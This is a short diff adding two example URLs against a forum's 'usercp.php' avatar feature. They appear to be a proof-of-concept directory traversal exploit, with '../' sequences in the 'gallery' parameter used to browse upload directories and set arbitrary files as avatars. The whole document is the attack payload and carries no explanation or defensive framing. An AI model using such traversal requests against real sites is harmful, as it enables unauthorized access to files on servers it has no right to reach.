@@ -1,0 +1,2 @@
+http://www.example.com/usercp.php?action=avatar&amp;gallery=../../uploads
+http://www.example.com/usercp.php?action=do_avatar&amp;gallery=../../../../../../..dir&amp;avatar=myfile
